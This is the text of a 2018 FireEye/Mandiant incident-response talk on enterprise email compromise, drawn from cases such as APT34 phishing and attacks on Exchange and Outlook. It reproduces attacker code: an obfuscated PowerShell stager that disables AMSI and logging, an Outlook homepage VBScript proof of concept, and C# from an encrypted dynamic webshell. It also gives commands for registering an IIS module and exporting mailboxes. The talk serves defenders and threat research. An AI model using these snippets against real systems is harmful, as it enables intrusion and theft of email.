You’ve Got Mail!
Enterprise Email Compromise

Case studies and examples are drawn from our experiences and activities working
for a variety of customers, and do not represent our work for any one customer
or set of customers. In many cases, facts have been changed to obscure the
identity of our customers and individuals associated with our customers

OCTOBER 1 – 4, 2018 | WASHINGTON, D.C.

2

Introductions
Dan Caban

§ $whoami
– Principal Consultant
§ Incident Response & Forensics

– .CA & .AE
– 13.5 years in the industry
– 4 years with Mandiant
@danielcabaniel
linkedin.com/in/dan.caban/
©2018 FireEye

3

Introductions
Muks Hirani

§ $whoami
– Technical Director
§ Incident Response in the Middle East & Africa

– .CO.UK & .AE
– 5.5 years with Mandiant
– Previous UK Government
@cyberamyntas
linkedin.com/in/cyberamyntas/
©2018 FireEye

4

Agenda
§ Getting Access
§ The Second Factor?
§ Attack the Client
§ Webshells
§ IIS Modules and Handlers
§ PowerShell, ECP and EWS

©2018 FireEye

Source: Wikimedia Commons
You Got Mail!

5

Agenda
§ Getting Access
§ The Second Factor?
§ Attack the Client
§ Webshells
§ IIS Modules and Handlers
§ PowerShell, ECP and EWS

©2018 FireEye

Source: Wikimedia Commons

Attack Lifecycle
Maintain Presence

Initial Compromise

©2018 FireEye

Establish Foothold

Escalate Privileges

Move Laterally

Internal Reconnaissance

Complete Mission

Attack Lifecycle
Maintain Presence

Initial Compromise

Establish Foothold

Escalate Privileges

Move Laterally

Internal Reconnaissance

ALL THE THINGS!
©2018 FireEye

Complete Mission

Getting Access

GETTING ACCESS: Social Engineering
Targeting employees with social engineering tactics
and phishing is still incredibly effective.

§ Low/Medium success:
– Masquerading Domains
– Confusingly Similar
– gTLD or INTL TLD variants
– Security Alerts

§ High success:
©2018 FireEye

– Abuse of trust from trusted suppliers and
internally.

GETTING ACCESS: Social Engineering

◆Services
◆Products
◆Licenses
◆Hardware

©2018 FireEye

APT 34
Iranian Cyber Espionage Group

Since at least 2014, an Iranian threat
group tracked by FireEye as APT34 has
conducted reconnaissance aligned
with the strategic interests of Iran.
§ APT34 conducts operations primarily in the

Middle East, targeting financial, government,
energy, chemical, telecommunications and
other industries.

§ APT34 uses a mix of public and non-public tools
and often uses compromised accounts to
conduct spear-phishing operations.

§ APT34 often leverages social media to perform
initial reconnaissance and targeting.

©2018 FireEye

GETTING ACCESS: A Case Study in APT 34
Email from
Trusted
Partner

Enable
Macros?
OK!

Mimikatz

Lateral
Movement
to
Exchange

§ Later:
– Evidence of staged .RAR/.PNG files on Exchange servers
§ 206 HTTP (Download manager)

– Evidence of reading the email of IT security

©2018 FireEye

Plants
Webshells

3 Hours Later....
Coffee Break

GETTING ACCESS: Social Engineering

©2018 FireEye

If($PSVErSIONTaBLe.PSVErsiOn.MAjOR -GE
3){$GPS=[rEf].ASSEmbLy.GetTypE('System.Managem
ent.Automation.Utils')."GETFiE`LD"('cachedGroupPoli
cySettings','N'+'onPublic,Static').GEtVAlUe($NUlL);If($
GPS['ScriptB'+'lockLogging']){$GPS['ScriptB'+'lockLog
ging']['EnableScriptB'+'lockLogging']=0;$GPS['ScriptB
'+'lockLogging']['EnableScriptBlockInvocationLoggin
g']=0}ELse{[SCriPTBLoCk]."GetFIe`ld"('signatures','N'+'
onPublic,Static').SEtVALue($nUll,(New-OBJeCT
CollECTioNs.GEnERIc.HaSHSeT[sTRinG]))}[REf].AsSEmB
lY.GetTyPE('System.Management.Automation.AmsiU
tils')|?{$_}|%{$_.GETFIELD('amsiInitFailed','NonPublic,
Static').SEtVAlue($Null,$truE)};};[SYstEm.NET.SerVIcEP
OInTMaNAgEr]::ExPeCt100COnTINUE=0;$wc=NewOBjEcT SysTEm.NET.WEBCLiEnT;$u='Mozilla/5.0
(Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like
Gecko';$WC.HEaderS.Add('UserAgent',$u);$WC.Proxy=[SystEM.NeT.WeBREQUESt]::D
efaULtWeBProXY;$Wc.PROxY.CrEdentIALS =….

GETTING ACCESS: Reliable Ammunition
One methodology used to ensure a near 100%
success rate to avoid suspicion:

§ Register a confusingly similar domain name.
Example:

§ WORLDARABBANK.COM
§ WORLDARABANK.COM

§ Setup a “Catch-All” for an emails from third parties
destined toward.

§ Collect expected emails from third parties,

weaponize and resend to the correct address.

©2018 FireEye

GETTING ACCESS: A Case Study #1

Categorized
Phish

©2018 FireEye

A few
victims

Bravo!
Block, Reset,
Delete

Case Closed!

GETTING ACCESS: A Case Study #1
Categorized
Phish

Block, Reset,
Delete

A C-Level on
holiday

Distribution
Group

Bravo!
Case Closed!

Categorized
Phish

©2018 FireEye

Entire
Organization

Blocked!

GETTING ACCESS: A Case Study #1
Categorized
Phish

Block, Reset,
Delete

A C-Level on
holiday

Distribution
Group

Bravo!
Case Closed!

Categorized
Phish

©2018 FireEye

Entire
Organization

Blocked!

Guest Wifi

GETTING ACCESS: A Case Study #1
§ 2nd password reset after
users reported
outbound emails

§ 12GB gone over 3 days

©2018 FireEye

GETTING ACCESS: A Case Study #2
§ The Red Team successfully collected credentials through a targeted phishing
campaign

– Two users with the same generic “welcome” password set by IT.
– The same password was found in open source dumped databases.

§ Office 365 without 2FA

©2018 FireEye

GETTING ACCESS: A Case Study #2
§ 848 accounts with the same password (18%)
§ 8 domains, which included subsidiaries
§ 22 million email objects
§ 4.8TB of email data
§ Without considering:
– Other Office 365 services like OneDrive
– Web services that share authentication

©2018 FireEye

The Second Factor?

©2018 FireEye

23

THE SECOND FACTOR? SMS Text Message OTP
§ A customer began a project to implement text message OTP for 2FA.
§ The OTP was sent to the phone number associated with the user in AD.
Can you imagine what happened?

©2018 FireEye

24

THE SECOND FACTOR? SMS Text Message OTP
§ A customer began a project to implement text message OTP for 2FA.
§ The OTP was sent to the phone number associated with the user in AD.
Can you imagine what happened?

©2018 FireEye

THE SECOND FACTOR? Delivered via Email
§ A customer implemented MAC address based 2FA for VPN remote access.
Can you imagine what happened?

©2018 FireEye

THE SECOND FACTOR? Delivered via Email
§ A customer implemented MAC address based 2FA for VPN remote access.
Can you imagine what happened?

§ A customer began a project to implement soft tokens with RSA for 2FA.
§ Attacker has been actively reading the “RSA” email address used for token

delivery.

§ Copied the entire “.pst” archive a compromised server.
§ Attacker had been accessing the RSA Authentication Manager.

Can you imagine what happened?

©2018 FireEye

THE SECOND FACTOR? Third Parties
§ “ActiveSync continues to work as it did prior to installing Duo. Duo's OWA

application does not add two-factor authentication to the EWS and ActiveSync
endpoints. ActiveSync clients will not see an MFA prompt. We do not
recommend exposing the ActiveSync endpoint to external access.”

©2018 FireEye

§ 2nd password reset after
report

§ 12GB gone over 3 days
§ Reset unsuccessful?
– ActiveSync

§ SPAM

©2018 FireEye

Attack the Client

30

Attack The Client: Client Side
§ Vulnerabilities found in Outlook configuration.

Server Zone (DMZ)

– Patched promptly.

§ Issues include:
– Rules

Exchange Server

§ Abuse of rules designed to open a local document.

– Homepages
§ Abuse of HTML homepages for inboxes.

§ Seen in the wild!

©2018 FireEye

Offsite / Untrusted

Client Zone (Secure)

31

Attack The Client: HomePage
§ POC

©2018 FireEye

<script id=clientEventHandlersVBS language=vbscript>
<!-Sub window_onload()
Set Application = ViewCtl1.OutlookApplication
Set objShell = Application.CreateObject("shell.application")
objShell.ShellExecute "cmd.exe ", " /c calc.exe", "", "", 0
Set objShell = nothing
End Sub
-->
</script>
</head>
<body>
<object classid="clsid:0006F063-0000-0000-C000-000000000046" id="ViewCtl1" data=""></object>

Attack The Client: HomePage
§ POC
Client

©2018 FireEye

Attack The Client: Add-Ins
POSTALBOOK / POSTALDOOR

§ An .NET Outlook Add-in backdoor capable of:
– download
– upload
– execute
– load modular plugins
– sysinfo

§ Creates a hidden folder for messages.
§ Creates a rule to move incoming/outgoing messages to hidden folder.

©2018 FireEye

34

Attack The Client: Add-Ins
POSTALBOOK / POSTALDOOR

§ Embedded resource with configuration data XOR’d
§ RSA encryption keys
§ Email beacon addresses.
§ Email beacon format and templates.

§ On Launch of Outlook:
§ Uses WMI and Registry settings as beacon details.
§ Beacon is encrypted and embedded as a PNG chunk.
§ PNG is embedded as base64 into HTML email formatted by configuration
template.
©2018 FireEye

Attack The Client: Add-Ins
POSTALBOOK / POSTALDOOR

§ Adds handler to read all incoming email
IsMailForMe()?
• SMTP References
•Validated md5
bytes

©2018 FireEye

PNG Images?
• Base64
Embedded
• Attach,emts

Decrypt
• Validate Header
• Extract Chunk
• Decrypt Chunk

Profit?
• download
• upload
• Execute, etc.

Attack The Client: Backdoors
0x00FACADE

§ A .DLL backdoor capable of:
– harvesting e-mail
– uploading
– downloading
– execution

§ Supports the following e-mail clients:
– Microsoft Outlook
– Outlook Express
– Thunderbird
– The Bat!

©2018 FireEye

Webshells

38

Webshells

©2018 FireEye

39

Webshells: Exchange
§ A default Exchange 2013 install:
– .ASPX Files: 584 files in 55 folders
– .DLL Modules (more on this later): 20 Native and 14 Managed

…
©2018 FireEye

40

Webshells: The Beginning

©2018 FireEye

41

Webshells: Evasions & Embedding

©2018 FireEye

42

Webshells: A recent technique
flogon.is
logon.aspx
logoff.aspx
ftpext.tlb

©2018 FireEye

43

Webshells: Dynamic
§ COOKIES contain encrypted webshell
along with key necessary for
decryption.

§ POST data that is intended to be
interpreted by final web shell.

Cookies

©2018 FireEye

RC4
Decrypt

Compile
in
Memory

Run
Dynamic
Webshell

HttpCookie s = Request.Cookies["session"];
HttpCookie s_id = Request.Cookies["session_id"];
….
SHA1 sha = new SHA1CryptoServiceProvider();
byte[] serial1 = System.Convert.FromBase64String(s_id.Value.Substring(1));
byte[] serial2 = System.Text.Encoding.UTF8.GetBytes("722f4494-15b6-4748-ae537aa3a57821b2");
byte[] serial = new byte[serial1.Length + serial2.Length];
System.Buffer.BlockCopy(serial1, 0, serial, 0, serial1.Length);
System.Buffer.BlockCopy(serial2, 0, serial, serial1.Length, serial2.Length);
byte[] e1 = sha.ComputeHash(serial);
byte[] e2 = System.Convert.FromBase64String(s.Value.Substring(1))
string session = System.Text.Encoding.UTF8.GetString(RC4.crypt(e1, e2));
…
ICodeCompiler loCompiler = new CSharpCodeProvider().CreateCompiler();
CompilerParameters loParameters = new CompilerParameters();
…
// *** Load the resulting assembly into memory
loParameters.GenerateInMemory = true;
/ *** Now compile the whole thing
CompilerResults loCompiled =
loCompiler.CompileAssemblyFromSource(loParameters,session); /
Assembly loAssembly = loCompiled.CompiledAssembly;
…
object loObject = loAssembly.CreateInstance("MyNamespace.MyClass");
object[] loCodeParms = new object[3];
loCodeParms[0] = Request;
loCodeParms[1] = Response;
loCodeParms[2] = e1;
…
object loResult =
loObject.GetType().InvokeMember("DynamicCode",BindingFlags.InvokeMethod,
null,loObject,loCodeParms);

44

Webshells: Dynamic
§ COOKIES contain encrypted webshell
along with key necessary for
decryption.

public class MyClass
{
public void DynamicCode(params object[] Parameters)
{
HttpRequest Request = (HttpRequest) Parameters[0];
HttpResponse Response = (HttpResponse) Parameters[1];
byte[] key = (byte[]) Parameters[2];
Random r = new Random();
Response.ClearContent();

§ POST data that is intended to be

try {
string output = "";

interpreted by final web shell.

Cookies

RC4
Decrypt

Compile
in
Memory

byte[] bytes = Request.BinaryRead(Request.ContentLength);
bytes = RC4.crypt(key, bytes);
FileStream fs = File.OpenWrite(@"c:\PerfLogs\Bandwidth.ps1");
fs.Seek(0, SeekOrigin.Begin);
fs.Write(bytes, 0, bytes.Length);
fs.Flush();
fs.Close();
output = "OK”;

Run
Dynamic
Webshell
….

©2018 FireEye

45

Webshells: Dynamic & Signed
§ Attacker used a RSA private key that matches the hard-coded 2,048-bit public key,
embedded inside the web shell

String n = "0TvWBLFriALALHr0T7FEOCder7jFUjuocg5Nw/OSQ1EhwQ3oj5Exuxo+kD/CDldF8MM/==etc..etc..
RSACryptoServiceProvider RSA = new RSACryptoServiceProvider();
RSAParameters param = new RSAParameters();
param.Modulus = Convert.FromBase64String(n);

Name
s

Usage
Base64-encoded RSA signature for the source code. It used the RSACryptoServiceProvider::VerifyData and SHA-1 as a hashing
algorithm.

d

Base64 encoded AES128-CBC encrypted .NET source code. Will be executed if the signature in HTTP POST parameter ”s”
matches.

p

Thee Base64 encoded parameters supplied to the compiled code, also AES128-CBC encrypted.

sc

Name of the HTTP(s) cookie to store the file name where the symmetric key is stored.

©2018 FireEye

46

Webshells: Dynamic & Signed
Attacker
Source code

getidtoken.aspx
No

SC
cookie
set?

HTTP POST Request

Yes

2048 bits RSA
private key

Generate:
AES key (128 bit)
GUID (128 bit)

HTTP Response
GUID

Read AES key
From file
%TEMP%\GUID

HTTP POST Request
Decrypt source
code via HTTP
POST ‘d’.
‘s’ and ‘p’

No

Signed
code
Ok?

Yes

©2018 FireEye

Decrypt source
code via HTTP
POST ‘d’.
‘s’ and ‘p’

End

Decode
code in
‘d’

Compile and
execute with ‘p’
parameters

IIS Modules, Handlers, and Transport
Agents

48

Extending IIS
§ GET /webshell.aspx?cmd=whoami
§ POST /webshell.aspx
– cmd=whoami

©2018 FireEye

49

Extending IIS
§ GET /
§ POST /

©2018 FireEye

50

Extending IIS
§ ISAPI Filters in the past
§ Managed Modules
– .NET
– Inherits ASP.NET privileges (web.config)

§ Native Modules
– C++
– Admin rights required to register (GUI or AppCmd)
– Elevated privileges
– Can access all requests, not just .aspx
Appcmd.exe install module /name:MODULE_NAME /image:PATH_TO_DLL
©2018 FireEye

Source:
https://msdn.microsoft.com/en-us/library/bb470252.aspx

51

Extending IIS: Managed Modules
§ Microsoft.Exchange.Clients.Auth.dll

©2018 FireEye

52

Extending IIS: Native Modules
§ Exported function: RegisterModule
§ HttpParser.dll
– RGSESSIONID cookie contains base64 encoded & XOR’d command.
§ Execute: cmd$
§ Upload: upload$
§ Download: download$

§ HttpModule.dll
– If 25th known headers in HTTP raw header is "Default-Windows”
§ Execute: rc
§ Upload: uf
§ Download: df
©2018 FireEye

53

Extending IIS: Transport Agents
§ “Transport agents let you install custom software that is created by Microsoft, by

third-party vendors, or by your organization, on an Exchange server. This software
can then process email messages that pass through the transport pipeline.

§ In Microsoft Exchange Server 2013, the transport pipeline is made of the following
processes:

§ The Front End Transport service on Client Access servers
§ The Transport service on Mailbox servers
§ The Mailbox Transport service on Mailbox servers
§ The Transport service on Edge Transport servers”

©2018 FireEye

54

Extending IIS: Transport Agents
XTRANS

§ C2 commands and data as encrypted within PDF/JPEG attachments in emails.
– Highly configurable using encrypted xml config files
– Complex boolean logic containing and/or/not contains etc on:
§ Attachments
§ Subjects
§ Senders
§ Receivers

©2018 FireEye

55

Extending IIS: Transport Agents
XTRANS
Handler

Description

logHandler

Writes attachments to disk at the path identified by LOG_OUTPUT.

blockHandler

Does not manipulate the message but returns a value that could be used by the caller to process a
message differently, for example, block the message.

zipHandler

Write email contents to a ZIP_FILE_NAME with a portion of the file name being randomly generated
integer less than 99999.

commandHandler

Send command to the malware

changeSubjectHandler

Changes the subject of an email.

changeBodyHandler

Replaces the contents of the body of an email message.

createHandler

Duplicates an email message with the subject changed.

spamHandler

Sends multiple messages with the subject spam.

replaceHandler

Replaces attachments with a file located on disk.

statHandler

Collects the data, sender, recipient, subject, and attachment names into a comma separated list.

changeToHandler

Changes the recipient in an email message.

©2018 FireEye

Powershell, ECP, and EWS

57

PS, ECP, and EWS: Forwarders
§ ForwardSMTPAddress

©2018 FireEye

58

PS, ECP, and EWS: Rules
§ ForwardAsAttachmentTo, ForwardTo & RedirectTo

©2018 FireEye

59

PS, ECP, and EWS: Exporting
§ New-ManagementRoleAssignment -Role "Mailbox Import Export" -User
”dan@malwhere.com"

§ New-MailboxExportRequest -Mailbox poor.bloke -FilePath
\\MALWHEREMAIL01\PSTS\Email.pst

©2018 FireEye

60

PS, ECP, and EWS: e-Discovery
§ https://mail.server.com/ecp/

©2018 FireEye

PS, ECP, and EWS: e-Discovery
§ E-Discovery Feature in Microsoft Exchange that allows for you to search, collect,
and hold e-mail across all email accounts.

§ Identified email is collected and stored. The default account in all organizations is
– DiscoverySearchMailbox{d919ba05-46a6-415f-80ad-

7e09334bb852}@companyname.com

©2018 FireEye

62

PS, ECP, and EWS: e-Discovery
§ New-MailboxSearch (eDiscovery and Litigation Holds)

PROFIT!
©2018 FireEye

63

PS, ECP, and EWS: e-Discovery

©2018 FireEye

Attack Lifecycle
Maintain Presence

Initial Compromise

Establish Foothold

Escalate Privileges

Move Laterally

Internal Reconnaissance

ALL THE THINGS!
©2018 FireEye

Complete Mission

Thank you!